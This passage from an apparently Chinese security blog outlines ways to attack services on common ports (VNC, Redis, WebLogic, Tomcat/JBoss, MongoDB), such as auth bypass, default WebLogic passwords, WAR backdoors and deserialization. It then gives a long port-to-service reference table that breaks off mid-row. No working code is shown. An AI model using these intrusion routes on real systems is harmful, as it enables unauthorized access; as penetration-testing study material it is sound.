title="5900端口渗透剖析"></a>5900端口渗透剖析</h3><p>5900端口是优秀远程控制软件VNC的默认监听端口，此软件由著名的AT&amp;T的欧洲研究实验室开发的。VNC是在基于unix和linux操作系统的免费的开放源码软件，远程控制能力强大，高效实用，其性能可以和windows和MAC中的任何一款控制软件媲美。对于该端口的渗透，思路如下：<br>（1）VNC软件存在密码验证绕过漏洞，此高危漏洞可以使得恶意攻击者不需要密码就可以登录到一个远程系统。<br>（2）cain同样支持对VNC的嗅探，同时支持端口修改。<br>（3）VNC的配置信息同样被写入注册表系统中，其中包括连接的密码和端口。利用webshell的注册表读取功能进行读取加密算法，然后破解。（4）VNC拒绝服务攻击（CVE-2015-5239）。（<a href="http://blogs.360.cn/post/vnc%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9Ecve-2015-5239%E5%88%86%E6%9E%90.html%EF%BC%89%EF%BC%885%EF%BC%89VNC%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88CVE-2013-6886%EF%BC%89%E3%80%82">http://blogs.360.cn/post/vnc%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9Ecve-2015-5239%E5%88%86%E6%9E%90.html）（5）VNC权限提升（CVE-2013-6886）。</a></p><h3 id="6379端口渗透剖析"><a href="#6379端口渗透剖析" class="headerlink" title="6379端口渗透剖析"></a>6379端口渗透剖析</h3><p>Redis是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。<br>（1）爆破：弱口令<br>（2）未授权访问+配合ssh key提权。（<a href="http://www.alloyteam.com/2017/07/12910/%EF%BC%89">http://www.alloyteam.com/2017/07/12910/）</a></p><h3 id="7001-x2F-7002端口渗透剖析"><a href="#7001-x2F-7002端口渗透剖析" class="headerlink" title="7001&#x2F;7002端口渗透剖析"></a>7001&#x2F;7002端口渗透剖析</h3><p>7001&#x2F;7002通常是weblogic中间件端口<br>（1）弱口令、爆破，弱密码一般为weblogic&#x2F;Oracle@123 or weblogic<br>（2）管理后台部署 war 后门<br>（3）SSRF<br>（4）反序列化漏洞<br>（5）weblogic_uac<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrfhttps://bbs.pediy.com/thread-224954.htmhttps://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrfhttps://bbs.pediy.com/thread-224954.htmhttps://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html</a></p><h3 id="8080端口渗透剖析"><a href="#8080端口渗透剖析" class="headerlink" title="8080端口渗透剖析"></a>8080端口渗透剖析</h3><p>8080端口通常是apache_Tomcat服务器默认监听端口，apache是世界使用排名第一的web服务器。国内很多大型系统都是使用apache服务器，对于这种大型服务器的渗透，主要有以下方法：<br>（1）Tomcat远程代码执行漏洞（<a href="https://www.freebuf.com/column/159200.html%EF%BC%89">https://www.freebuf.com/column/159200.html）</a><br>（2）Tomcat任意文件上传。（<a href="http://liehu.tass.com.cn/archives/836%EF%BC%89">http://liehu.tass.com.cn/archives/836）</a><br>（3）Tomcat远程代码执行&amp;信息泄露。（<a href="https://paper.seebug.org/399/%EF%BC%89">https://paper.seebug.org/399/）</a><br>（4）Jboss远程代码执行。（<a href="http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html%EF%BC%89">http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html）</a><br>（5）Jboss反序列化漏洞。（<a href="https://www.zybuluo.com/websec007/note/838374%EF%BC%89">https://www.zybuluo.com/websec007/note/838374）</a><br>（6）Jboss漏洞利用。（<a href="https://blog.csdn.net/u011215939/article/details/79141624%EF%BC%89">https://blog.csdn.net/u011215939/article/details/79141624）</a></p><h3 id="27017端口渗透剖析"><a href="#27017端口渗透剖析" class="headerlink" title="27017端口渗透剖析"></a>27017端口渗透剖析</h3><p>MongoDB，NoSQL数据库；攻击方法与其他数据库类似</p><p>（1）爆破：弱口令<br>（2）未授权访问；（<a href="http://www.cnblogs.com/LittleHann/p/6252421.html%EF%BC%89%EF%BC%883%EF%BC%89http://www.tiejiang.org/19157.htm">http://www.cnblogs.com/LittleHann/p/6252421.html）（3）http://www.tiejiang.org/19157.htm</a></p><h2 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h2><table><thead><tr><th>端口号码 &#x2F; 层</th><th>名称</th><th>备注</th></tr></thead><tbody><tr><td>1</td><td>tcpmux</td><td>TCP 端口服务多路复用</td></tr><tr><td>5</td><td>rje</td><td>远程作业入口</td></tr><tr><td>7</td><td>echo</td><td>Echo 服务</td></tr><tr><td>9</td><td>discard</td><td>用于连接测试的空服务</td></tr><tr><td>11</td><td>systat</td><td>用于列举连接了的端口的系统状态</td></tr><tr><td>13</td><td>daytime</td><td>给请求主机发送日期和时间</td></tr><tr><td>17</td><td>qotd</td><td>给连接了的主机发送每日格言</td></tr><tr><td>18</td><td>msp</td><td>消息发送协议</td></tr><tr><td>19</td><td>chargen</td><td>字符生成服务；发送无止境的字符流</td></tr><tr><td>20</td><td>ftp-data</td><td>FTP 数据端口</td></tr><tr><td>21</td><td>ftp</td><td>文件传输协议（FTP）端口；有时被文件服务协议（FSP）使用</td></tr><tr><td>22</td><td>ssh</td><td>安全 Shell（SSH）服务</td></tr><tr><td>23</td><td>telnet</td><td>Telnet 服务</td></tr><tr><td>25</td><td>smtp</td><td>简单邮件传输协议（SMTP）</td></tr><tr><td>37</td><td>time</td><td>时间协议</td></tr><tr><td>39</td><td>rlp</td><td>资源定位协议</td></tr><tr><td>42</td><td>nameserver</td><td>互联网名称服务</td></tr><tr><td>43</td><td>nicname</td><td>WHOIS 目录服务</td></tr><tr><td>49</td><td>tacacs</td><td>用于基于 TCP&#x2F;IP 验证和访问的终端访问控制器访问控制系统</td></tr><tr><td>50</td><td>re-mail-ck</td><td>远程邮件检查协议</td></tr><tr><td>53</td><td>domain</td><td>域名服务（如 BIND）</td></tr><tr><td>63</td><td>whois++</td><td>WHOIS++，被扩展了的 WHOIS 服务</td></tr><tr><td>67</td><td>bootps</td><td>引导协议（BOOTP）服务；还被动态主机配置协议（DHCP）服务使用</td></tr><tr><td>68</td><td>bootpc</td><td>Bootstrap（BOOTP）客户；还被动态主机配置协议（DHCP）客户使用</td></tr><tr><td>69</td><td>tftp</td><td>小文件传输协议（TFTP）</td></tr><tr><td>70</td><td>gopher</td><td>Gopher 互联网文档搜寻和检索</td></tr><tr><td>71</td><td>netrjs-1</td><td>远程作业服务</td></tr><tr><td>72</td><td>netrjs-2</td><td>远程作业服务</td></tr><tr><td>73</td><td>netrjs-3</td><td>远程作业服务</td></tr><tr><td>73</td><td>netrjs-4</td><td>远程作业服务</td></tr><tr><td>79</td><td>finger</td><td>用于用户联系信息的 Finger 服务</td></tr><tr><td>80</td><td>http</td><td>用于万维网（WWW）服务的超文本传输协议（HTTP）</td></tr><tr><td>88</td><td>kerberos</td><td>Kerberos 网络验证系统</td></tr><tr><td>95</td><td>supdup</td><td>Telnet 协议扩展</td></tr><tr><td>101</td><td>hostname</td><td>SRI-NIC 机器上的主机名服务</td></tr><tr><td>102</td><td>iso-tsap</td><td>ISO 开发环境（ISODE）网络应用</td></tr><tr><td>105</td><td>csnet-ns</td><td>邮箱名称服务器；也被 CSO 名称服务器使用</td></tr><tr><td>107</td><td>rtelnet</td><td>远程 Telnet</td></tr><tr><td>109</td><td>pop2</td><td>邮局协议版本2</td></tr><tr><td>110</td><td>pop3</td><td>邮局协议版本3</td></tr><tr><td>111</td><td>sunrpc</td><td>用于远程命令执行的远程过程调用（RPC）协议，被网络文件系统（NFS）使用</td></tr><tr><td>113</td><td>auth</td><td>验证和身份识别协议</td></tr><tr><td>115</td><td>sftp</td><td>安全文件传输协议（SFTP）服务</td></tr><tr><td>117</td><td>uucp-path</td><td>Unix 到 Unix 复制协议（UUCP）路径服务</td></tr><tr><td>119</td><td>nntp</td><td>用于 USENET 讨论系统的网络新闻传输协议（NNTP）</td></tr><tr><td>123</td><td>ntp</td><td>网络时间协议（NTP）</td></tr><tr><td>137</td><td>netbios-ns</td><td>在红帽企业 Linux 中被 Samba 使用的 NETBIOS 名称服务</td></tr><tr><td>138</td><td>netbios-dgm</td><td>在红帽企业 Linux 中被 Samba 使用的 NETBIOS 数据报服务</td></tr><tr><td>139</td><td>netbios-ssn</td><td>在红帽企业 Linux 中被 Samba 使用的NET BIOS 会话服务</td></tr><tr><td>143</td><td>imap</td><td>互联网消息存取协议（IMAP）</td></tr><tr><td>161</td><td>snmp</td><td>简单网络管理协议（SNMP）</td></tr><tr><td>162</td><td>snmptrap</td><td>SNMP 的陷阱</td></tr><tr><td>163</td><td>cmip-man</td><td>通用管理信息协议（CMIP）</td></tr><tr><td>164</td><td>cmip-agent</td><td>通用管理信息协议（CMIP）</td></tr><tr><td>174</td><td>mailq</td><td>MAILQ</td></tr><tr><td>177</td><td>xdmcp</td><td>X 显示管理器控制协议</td></tr><tr><td>178</td><td>nextstep</td><td>NeXTStep 窗口服务器</td></tr><tr><td>179</td><td>bgp</td><td>边界网络协议</td></tr><tr><td>191</td><td>prospero</td><td>Cliffod Neuman 的 Prospero 服务</td></tr><tr><td>194</td><td>irc</td><td>互联网中继聊天（IRC）</td></tr><tr><td>199</td><td>smux</td><td>SNMP UNIX 多路复用</td></tr><tr><td>201</td><td>at-rtmp</td><td>AppleTalk 选路</td></tr><tr><td>202</td><td>at-nbp</td><td>AppleTalk 名称绑定</td></tr><tr><td>204</td><td>at-echo</td><td>AppleTalk echo 服务</td></tr><tr><td>206</td><td>at-zis</td><td>AppleTalk 区块信息</td></tr><tr><td>209</td><td>qmtp</td><td>快速邮件传输协议（QMTP）</td></tr><tr><td>210</td><td>z39.50</td><td>NISO Z39.50 数据库</td></tr><tr><td>213</td><td>ipx</td><td>互联网络分组交换协议（IPX），被 Novell Netware 环境常用的数据报协议</td></tr><tr><td>220</td><td>imap3</td><td>互联网消息存取协议版本3</td></tr><tr><td>245</td><td>link</td><td>LINK</td></tr><tr><td>347</td><td>fatserv</td><td>Fatmen 服务器</td></tr><tr><td>363</td><td>rsvp_tunnel</td><td>RSVP 隧道</td></tr><tr><td>369</td><td>rpc2portmap</td><td>Coda 文件系统端口映射器</td></tr><tr><td>370</td><td>codaauth2</td><td>Coda 文件系统验证服务</td></tr><tr><td>372</td><td>ulistproc</td><td>UNIX Listserv</td></tr><tr><td>389</td><td>ldap</td><td>轻型目录存取协议（LDAP）</td></tr><tr><td>427</td><td>svrloc</td><td>服务位置协议（SLP）</td></tr><tr><td>434</td><td>mobileip-agent</td><td>可移互联网协议（IP）代理</td></tr><tr><td>435</td><td>mobilip-mn</td><td>可移互联网协议（IP）管理器</td></tr><tr><td>443</td><td>https</td><td>安全超文本传输协议（HTTP）</td></tr><tr><td>444</td><td>snpp</td><td>小型网络分页协议</td></tr><tr><td>445</td><td>microsoft-ds</td><td>通过 TCP&#x2F;IP 的服务器消息块（SMB）</td></tr><tr><td>464</td><td>kpasswd</td><td>Kerberos 口令和钥匙改换服务</td></tr><tr><td>468</td><td>photuris</td><td>Photuris 会话钥匙管理协议</td></tr><tr><td>487</td><td>saft</td><td>简单不对称文件传输（SAFT）协议</td></tr><tr><td>488</td><td>gss-http</td><td>用于 HTTP 的通用安全服务（GSS）</td></tr><tr><td>496</td><td>pim-rp-disc</td><td>用于协议独立的多址传播（PIM）服务的会合点发现（RP-DISC）</td></tr><tr><td>500</td><td>isakmp</td><td>互联网安全关联和钥匙管理协议（ISAKMP）</td></tr><tr><td>535</td><td>iiop</td><td>互联网内部对象请求代理协议（IIOP）</td></tr><tr><td>538</td><td>gdomap</td><td>GNUstep 分布式对象映射器（GDOMAP）</td></tr><tr><td>546</td><td>dhcpv6-client</td><td>动态主机配置协议（DHCP）版本6客户</td></tr><tr><td>547</td><td>dhcpv6-server</td><td>动态主机配置协议（DHCP）版本6服务</td></tr><tr><td>554</td><td>rtsp</td><td>实时流播协议（RTSP）</td></tr><tr><td>563</td><td>nntps</td><td>通过安全套接字层的网络新闻传输协议（NNTPS）</td></tr><tr><td>565</td><td>whoami</td><td>whoami</td></tr><tr><td>587</td><td>submission</td><td>邮件消息提交代理（MSA）</td></tr><tr><td>610</td><td>npmp-local</td><td>网络外设管理协议（NPMP）本地 &#x2F; 分布式排队系统（DQS）</td></tr><tr><td>611</td><td>npmp-gui</td><td>网络外设管理协议（NPMP）GUI &#x2F; 分布式排队系统（DQS）</td></tr><tr><td>612</td><td>hmmp-ind</td><td>HMMP 指示 &#x2F; DQS</td></tr><tr><td>631</td><td>ipp</td><td>互联网打印协议（IPP）</td></tr><tr><td>636</td><td>ldaps</td><td>通过安全套接字层的轻型目录访问协议（LDAPS）</td></tr><tr><td>674</td><td>acap</td><td>应用程序配置存取协议（ACAP）</td></tr><tr><td>694</td><td>ha-cluster</td><td>用于带有高可用性的群集的心跳服务</td></tr><tr><td>749</td><td>kerberos-adm</td><td>Kerberos 版本5（v5）的“kadmin”数据库管理</td></tr><tr><td>750</td><td>kerberos-iv</td><td>Kerberos 版本4（v4）服务</td></tr><tr><td>765</td><td>webster</td><td>网络词典</td></tr><tr><td>767</td><td>phonebook</td><td>网络电话簿</td></tr><tr><td>873</td><td>rsync</td><td>rsync 文件传输服务</td></tr><tr><td>992</td><td>telnets</td><td>通过安全套接字层的 Telnet（TelnetS）</td></tr><tr><td>993</td><td>imaps</td><td>通过安全套接字层的互联网消息存取协议（IMAPS）</td></tr><tr><td>994</td><td>ircs</td><td>通过安全套接字层的互联网中继聊天（IRCS）</td></tr><tr><td>995</td><td>pop3s</td><td>通过安全套接字层的邮局协议版本3（POPS3）</td></tr></tbody></table><h2 id="UNIX-特有的端口"><a href="#UNIX-特有的端口" class="headerlink" title="UNIX 特有的端口"></a>UNIX 特有的端口</h2><p>以下端口是 UNIX 特有的，涉及了从电子邮件到验证不等的服务。在方括号内的名称（如 [service]）是服务的守护进程名称或它的常用别名。</p><table><thead><tr><th>端口号码 &#x2F; 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>512&#x2F;tcp</td><td>exec</td><td>用于对远程执行的进程进行验证</td></tr><tr><td>512&#x2F;udp</td><td>biff [comsat]</td><td>异步邮件客户（biff）和服务（comsat）</td></tr><tr><td>513&#x2F;tcp</td><td>login</td><td>远程登录（rlogin）</td></tr><tr><td>513&#x2F;udp</td><td>who [whod]</td><td>登录的用户列表</td></tr><tr><td>514&#x2F;tcp</td><td>shell [cmd]</td><td>不必登录的远程 shell（rshell）和远程复制（rcp）</td></tr><tr><td>514&#x2F;udp</td><td>syslog</td><td>UNIX 系统日志服务</td></tr><tr><td>515</td><td>printer [spooler]</td><td>打印机（lpr）假脱机</td></tr><tr><td>517&#x2F;udp</td><td>talk</td><td>远程对话服务和客户</td></tr><tr><td>518&#x2F;udp</td><td>ntalk</td><td>网络交谈（ntalk），远程对话服务和客户</td></tr><tr><td>519</td><td>utime [unixtime]</td><td>UNIX 时间协议（utime）</td></tr><tr><td>520&#x2F;tcp</td><td>efs</td><td>扩展文件名服务器（EFS）</td></tr><tr><td>520&#x2F;udp</td><td>router [route, routed]</td><td>选路信息协议（RIP）</td></tr><tr><td>521</td><td>ripng</td><td>用于互联网协议版本6（IPv6）的选路信息协议</td></tr><tr><td>525</td><td>timed [timeserver]</td><td>时间守护进程（timed）</td></tr><tr><td>526&#x2F;tcp</td><td>tempo [newdate]</td><td>Tempo</td></tr><tr><td>530&#x2F;tcp</td><td>courier [rpc]</td><td>Courier 远程过程调用（RPC）协议</td></tr><tr><td>531&#x2F;tcp</td><td>conference [chat]</td><td>互联网中继聊天</td></tr><tr><td>532</td><td>netnews</td><td>Netnews</td></tr><tr><td>533&#x2F;udp</td><td>netwall</td><td>用于紧急广播的 Netwall</td></tr><tr><td>540&#x2F;tcp</td><td>uucp [uucpd]</td><td>Unix 到 Unix 复制服务</td></tr><tr><td>543&#x2F;tcp</td><td>klogin</td><td>Kerberos 版本5（v5）远程登录</td></tr><tr><td>544&#x2F;tcp</td><td>kshell</td><td>Kerberos 版本5（v5）远程 shell</td></tr><tr><td>548</td><td>afpovertcp</td><td>通过传输控制协议（TCP）的 Appletalk 文件编制协议（AFP）</td></tr><tr><td>556</td><td>remotefs [rfs_server, rfs]</td><td>Brunhoff 的远程文件系统（RFS）</td></tr></tbody></table><h2 id="注册的端口"><a href="#注册的端口" class="headerlink" title="注册的端口"></a>注册的端口</h2><p>列举了由网络和软件社区向 IANA 提交的要在端口号码列表中正式注册的端口。</p><table><thead><tr><th>端口号码 &#x2F; 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>1080</td><td>socks</td><td>SOCKS 网络应用程序代理服务</td></tr><tr><td>1236</td><td>bvcontrol [rmtcfg]</td><td>Garcilis Packeten 远程配置服务器</td></tr><tr><td>1300</td><td>h323hostcallsc</td><td>H.323 电话会议主机电话安全</td></tr><tr><td>1433</td><td>ms-sql-s</td><td>Microsoft SQL 服务器</td></tr><tr><td>1434</td><td>ms-sql-m</td><td>Microsoft SQL 监视器</td></tr><tr><td>1494</td><td>ica</td><td>Citrix ICA 客户</td></tr><tr><td>1512</td><td>wins</td><td>Microsoft Windows 互联网名称服务器</td></tr><tr><td>1524</td><td>ingreslock</td><td>Ingres 数据库管理系统（DBMS）锁定服务</td></tr><tr><td>1525</td><td>prospero-np</td><td>无特权的 Prospero</td></tr><tr><td>1645</td><td>datametrics [old-radius]</td><td>Datametrics &#x2F; 从前的 radius 项目</td></tr><tr><td>1646</td><td>sa-msg-port [oldradacct]</td><td>sa-msg-port &#x2F; 从前的 radacct 项目</td></tr><tr><td>1649</td><td>kermit</td><td>Kermit 文件传输和管理服务</td></tr><tr><td>1701</td><td>l2tp [l2f]</td><td>第2层隧道服务（LT2P） &#x2F; 第2层转发（L2F）</td></tr><tr><td>1718</td><td>h323gatedisc</td><td>H.323 电讯守门装置发现机制</td></tr><tr><td>1719</td><td>h323gatestat</td><td>H.323 电讯守门装置状态</td></tr><tr><td>1720</td><td>h323hostcall</td><td>H.323 电讯主持电话设置</td></tr><tr><td>1758</td><td>tftp-mcast</td><td>小文件 FTP 组播</td></tr><tr><td>1759</td><td>mtftp</td><td>组播小文件 FTP（MTFTP）</td></tr><tr><td>1789</td><td>hello</td><td>Hello 路由器通信端口</td></tr><tr><td>1812</td><td>radius</td><td>Radius 拨号验证和记帐服务</td></tr><tr><td>1813</td><td>radius-acct</td><td>Radius 记帐</td></tr><tr><td>1911</td><td>mtp</td><td>Starlight 网络多媒体传输协议（MTP）</td></tr><tr><td>1985</td><td>hsrp</td><td>Cisco 热备用路由器协议</td></tr><tr><td>1986</td><td>licensedaemon</td><td>Cisco 许可管理守护进程</td></tr><tr><td>1997</td><td>gdp-port</td><td>Cisco 网关发现协议（GDP）</td></tr><tr><td>2049</td><td>nfs [nfsd]</td><td>网络文件系统（NFS）</td></tr><tr><td>2102</td><td>zephyr-srv</td><td>Zephyr 通知传输和发送服务器</td></tr><tr><td>2103</td><td>zephyr-clt</td><td>Zephyr serv-hm 连接</td></tr><tr><td>2104</td><td>zephyr-hm</td><td>Zephyr 主机管理器</td></tr><tr><td>2401</td><td>cvspserver</td><td>并行版本系统（CVS）客户 &#x2F; 服务器操作</td></tr><tr><td>2430&#x2F;tcp</td><td>venus</td><td>用于 Coda 文件系统（codacon 端口）的 Venus 缓存管理器</td></tr><tr><td>2430&#x2F;udp</td><td>venus</td><td>用于 Coda 文件系统（callback&#x2F;wbc interface 界面）的 Venus 缓存管理器</td></tr><tr><td>2431&#x2F;tcp</td><td>venus-se</td><td>Venus 传输控制协议（TCP）的副作用</td></tr><tr><td>2431&#x2F;udp</td><td>venus-se</td><td>Venus 用户数据报协议（UDP）的副作用</td></tr><tr><td>2432&#x2F;udp</td><td>codasrv</td><td>Coda 文件系统服务器端口</td></tr><tr><td>2433&#x2F;tcp</td><td>codasrv-se</td><td>Coda 文件系统 TCP 副作用</td></tr><tr><td>2433&#x2F;udp</td><td>codasrv-se</td><td>Coda 文件系统 UDP SFTP 副作用</td></tr><tr><td>2600</td><td>hpstgmgr [zebrasrv]</td><td>HPSTGMGR；Zebra 选路</td></tr><tr><td>2601</td><td>discp-client [zebra]</td><td>discp 客户；Zebra 集成的 shell</td></tr><tr><td>2602</td><td>discp-server [ripd]</td><td>discp 服务器；选路信息协议守护进程（ripd）</td></tr><tr><td>2603</td><td>servicemeter [ripngd]</td><td>服务计量；用于 IPv6 的 RIP 守护进程</td></tr><tr><td>2604</td><td>nsc-ccs [ospfd]</td><td>NSC CCS；开放式短路径优先守护进程（ospfd）</td></tr><tr><td>2605</td><td>nsc-posa</td><td>NSC POSA；边界网络协议守护进程（bgpd）</td></tr><tr><td>2606</td><td>netmon [ospf6d]</td><td>Dell Netmon；用于 IPv6 的 OSPF 守护进程（ospf6d）</td></tr><tr><td>2809</td><td>corbaloc</td><td>公共对象请求代理体系（CORBA）命名服务定位器</td></tr><tr><td>3130</td><td>icpv2</td><td>互联网缓存协议版本2（v2）；被 Squid 代理缓存服务器使用</td></tr><tr><td>3306</td><td>mysql</td><td>MySQL 数据库服务</td></tr><tr><td>3346</td><td>trnsprntproxy</td><td>Trnsprnt 代理</td></tr><tr><td>4011</td><td>pxe</td><td>执行前环境（PXE）服务</td></tr><tr><td>4321</td><td>rwhois</td><td>远程 Whois（rwhois）服务</td></tr><tr><td>4444</td><td>krb524</td><td>Kerberos 版本5（v5）到版本4（v4）门票转换器</td></tr><tr><td>5002</td><td>rfe</td><td>无射频以太网（RFE）音频广播系统</td></tr><tr><td>5308</td><td>cfengine</td><td>配置引擎（Cfengine）</td></tr><tr><td>5999</td><td>cvsup [CVSup]</td><td>CVSup 文件传输和更新工具</td></tr><tr><td>6000</td><td>x11 [X]</td><td>X 窗口系统服务</td></tr><tr><td>7000</td><td>afs3-fileserver</td><td>Andrew 文件系统（AFS）文件服务器</td></tr><tr><td>7001</td><td>afs3-callback</td><td>用于给缓存管理器回电的 AFS 端口</td></tr><tr><td>7002</td><td>afs3-prserver</td><td>AFS 用户和组群数据库</td></tr><tr><td>7003</td><td>afs3-vlserver</td><td>AFS 文件卷位置数据库</td></tr><tr><td>7004</td><td>afs3-kaserver</td><td>AFS Kerberos 验证服务</td></tr><tr><td>7005</td><td>afs3-volser</td><td>AFS 文件卷管理服务器</td></tr><tr><td>7006</td><td>afs3-errors</td><td>AFS 错误解释服务</td></tr><tr><td>7007</td><td>afs3-bos</td><td>AFS 基本监查进程</td></tr><tr><td>7008</td><td>afs3-update</td><td>AFS 服务器到服务器更新器</td></tr><tr><td>7009</td><td>afs3-rmtsys</td><td>AFS 远程缓存管理器服务</td></tr><tr><td>9876</td><td>sd</td><td>会话指引器</td></tr><tr><td>10080</td><td>amanda</td><td>高级 Maryland 自动网络磁盘归档器（Amanda）备份服务</td></tr><tr><td>11371</td><td>pgpkeyserver</td><td>良好隐私（PGP） &#x2F; GNU 隐私卫士（GPG）公钥服务器</td></tr><tr><td>11720</td><td>h323callsigalt</td><td>H.323 调用信号交替</td></tr><tr><td>13720</td><td>bprd</td><td>Veritas NetBackup 请求守护进程（bprd）</td></tr><tr><td>13721</td><td>bpdbm</td><td>Veritas NetBackup 数据库管理器（bpdbm）</td></tr><tr><td>13722</td><td>bpjava-msvc</td><td>Veritas NetBackup Java &#x2F; Microsoft Visual C++ (MSVC) 协议</td></tr><tr><td>13724</td><td>vnetd</td><td>Veritas 网络工具</td></tr><tr><td>13782</td><td>bpcd</td><td>Vertias NetBackup</td></tr><tr><td>13783</td><td>vopied</td><td>Veritas VOPIED 协议</td></tr><tr><td>22273</td><td>wnn6 [wnn4]</td><td>假名&#x2F;汉字转换系统</td></tr><tr><td>26000</td><td>quake</td><td>Quake（以及相关的）多人游戏服务器</td></tr><tr><td>26208</td><td>wnn6-ds</td><td></td></tr><tr><td>33434</td><td>traceroute</td><td>Traceroute 网络跟踪工具</td></tr></tbody></table><p>注: &#x2F;etc&#x2F;services中的注释如下：端口1236被注册为“bvcontrol”，但是它也被 Gracilis Packeten 远程配置服务器使用。正式名称被列为主要名称，未注册的名称被列为别名。  在&#x2F;etc&#x2F;services中的注释：端口 2600 到 2606 被 zebra 软件包未经注册而使用。主要名称是被注册的名称，被 zebra 使用的未注册名称被列为别名。  &#x2F;etc&#x2F;services 文件中的注释：该端口被注册为 wnn6，但是还在 FreeWnn 软件包中使用了未注册的“wnn4”。</p><h2 id="数据报传递协议端口"><a href="#数据报传递协议端口" class="headerlink" title="数据报传递协议端口"></a>数据报传递协议端口</h2><p>显示了一个和数据报传递协议（DDP）有关的端口列表。DDP 在 AppleTalk 网络上被使用。</p><table><thead><tr><th>端口号码 &#x2F; 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>1&#x2F;ddp</td><td>rtmp</td><td>路由表管理协议</td></tr><tr><td>2&#x2F;ddp</td><td>nbp</td><td>名称绑定协议</td></tr><tr><td>4&#x2F;ddp</td><td>echo</td><td>AppleTalk Echo 协议</td></tr><tr><td>6&#x2F;ddp</td><td>zip</td><td>区块信息协议</td></tr></tbody></table><h2 id="Kerberos（工程-Athena-x2F-MIT）端口"><a href="#Kerberos（工程-Athena-x2F-MIT）端口" class="headerlink" title="Kerberos（工程 Athena&#x2F;MIT）端口"></a>Kerberos（工程 Athena&#x2F;MIT）端口</h2><p>和 Kerberos 网络验证协议相关的端口列表。在标记的地方，v5 代表 Kerberos 版本5协议。注意，这些端口没有在 IANA 注册。</p><table><thead><tr><th>端口号码 &#x2F; 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>751</td><td>kerberos_master</td><td>Kerberos 验证</td></tr><tr><td>752</td><td>passwd_server</td><td>Kerberos 口令（kpasswd）服务器</td></tr><tr><td>754</td><td>krb5_prop</td><td>Kerberos v5 从属传播</td></tr><tr><td>760</td><td>krbupdate [kreg]</td><td>Kerberos 注册</td></tr><tr><td>1109</td><td>kpop</td><td>Kerberos 邮局协议（KPOP）</td></tr><tr><td>2053</td><td>knetd</td><td>Kerberos 多路分用器</td></tr><tr><td>2105</td><td>eklogin</td><td>Kerberos v5 加密的远程登录（rlogin）</td></tr></tbody></table><h2 id="未注册的端口"><a href="#未注册的端口" class="headerlink" title="未注册的端口"></a>未注册的端口</h2><p>一个未注册的端口列表。这些端口可能被安装在你的红帽企业 Linux 系统上的服务或协议使用，或者它们是在红帽企业 Linux 和运行其它操作系统的机器通信所必需的端口。</p><table><thead><tr><th>端口号码 &#x2F; 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>15&#x2F;tcp</td><td>netstat</td><td>网络状态（netstat）</td></tr><tr><td>98&#x2F;tcp</td><td>linuxconf</td><td>Linuxconf Linux 管理工具</td></tr><tr><td>106</td><td>poppassd</td><td>邮局协议口令改变守护进程（POPPASSD）</td></tr><tr><td>465&#x2F;tcp</td><td>smtps</td><td>通过安全套接字层的简单邮件传输协议（SMTPS）</td></tr><tr><td>616&#x2F;tcp</td><td>gii</td><td>使用网关的（选路守护进程）互动界面</td></tr><tr><td>808</td><td>omirr [omirrd]</td><td>联机镜像（Omirr）文件镜像服务</td></tr><tr><td>871&#x2F;tcp</td><td>supfileserv</td><td>软件升级协议（SUP）服务器</td></tr><tr><td>901&#x2F;tcp</td><td>swat</td><td>Samba 万维网管理工具（SWAT）</td></tr><tr><td>953</td><td>rndc</td><td>Berkeley 互联网名称域版本9（BIND 9）远程名称守护进程配置工具</td></tr><tr><td>1127</td><td>sufiledbg</td><td>软件升级协议（SUP）调试</td></tr><tr><td>1178&#x2F;tcp</td><td>skkserv</td><td>简单假名到汉字（SKK）日文输入服务器</td></tr><tr><td>1313&#x2F;tcp</td><td>xtel</td><td>法国 Minitel 文本信息系统</td></tr><tr><td>1529&#x2F;tcp</td><td>support [prmsd, gnatsd]</td><td>GNATS 错误跟踪系统</td></tr><tr><td>2003&#x2F;tcp</td><td>cfinger</td><td>GNU Finger 服务</td></tr><tr><td>2150</td><td>ninstall</td><td>网络安装服务</td></tr><tr><td>2988</td><td>afbackup</td><td>afbackup 客户-服务器备份系统</td></tr><tr><td>3128&#x2F;tcp</td><td>squid</td><td>Squid 万维网代理缓存</td></tr><tr><td>3455</td><td>prsvp</td><td>RSVP 端口</td></tr><tr><td>5432</td><td>postgres</td><td>PostgreSQL 数据库</td></tr><tr><td>4557&#x2F;tcp</td><td>fax</td><td>FAX 传输服务（旧服务）</td></tr><tr><td>4559&#x2F;tcp</td><td>hylafax</td><td>HylaFAX 客户-服务器协议（新服务）</td></tr><tr><td>5232</td><td>sgi-dgl</td><td>SGI 分布式图形库</td></tr><tr><td>5354</td><td>noclog</td><td>NOCOL 网络操作中心记录守护进程（noclogd）</td></tr><tr><td>5355</td><td>hostmon</td><td>NOCOL 网络操作中心主机监视</td></tr><tr><td>5680&#x2F;tcp</td><td>canna</td><td>Canna 日文字符输入界面</td></tr><tr><td>6010&#x2F;tcp</td><td>x11-ssh-offset</td><td>安全 Shell（SSH）X11 转发偏移</td></tr><tr><td>6667</td><td>ircd</td><td>互联网中继聊天守护进程（ircd）</td></tr><tr><td>7100&#x2F;tcp</td><td>xfs</td><td>X 字体服务器（XFS）</td></tr><tr><td>7666&#x2F;tcp</td><td>tircproxy</td><td>Tircproxy IRC 